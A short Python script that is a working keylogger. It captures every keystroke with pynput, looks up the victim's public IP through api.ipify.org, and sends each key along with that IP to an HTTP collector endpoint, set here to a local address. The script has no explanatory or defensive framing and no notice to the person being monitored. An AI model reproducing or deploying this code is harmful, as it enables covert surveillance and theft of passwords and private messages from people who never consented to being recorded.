import requests
import pynput.keyboard

user_ip = requests.get("https://api.ipify.org/").text
api_url = "http://127.0.0.1:8080/key/{}/{}" # 1: key, 2: ip

def on_press(key):
    requests.get(api_url.format(key, user_ip)).json()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()